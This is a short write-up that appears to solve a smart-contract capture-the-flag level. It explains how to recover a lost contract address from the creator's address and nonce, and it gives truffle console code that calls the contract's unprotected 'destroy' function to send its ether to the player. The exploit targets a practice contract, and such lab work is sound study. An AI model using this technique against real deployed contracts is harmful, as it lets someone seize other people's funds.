### Analysis
The easiest way to solve this problem is by viewing the transaction that created the contract in Etherscan and following where our 0.001 ETH goes. 
Another way to get the lost address is by utilizing the fact that creation of addresses of Ethereum is deterministic and can be calculated by:
~~~
keccack256(address, nonce)
~~~


### The Exploit
Run the code in truffle console:
~~~
functionSignature = {
    name: 'destroy',
    type: 'function',
    inputs: [
        {
            type: 'address',
            name: '_to'
        }
    ]
}

params = [player]

data = web3.eth.abi.encodeFunctionCall(functionSignature, params)

await web3.eth.sendTransaction({from: player, to: tokenAddr, data})
~~~
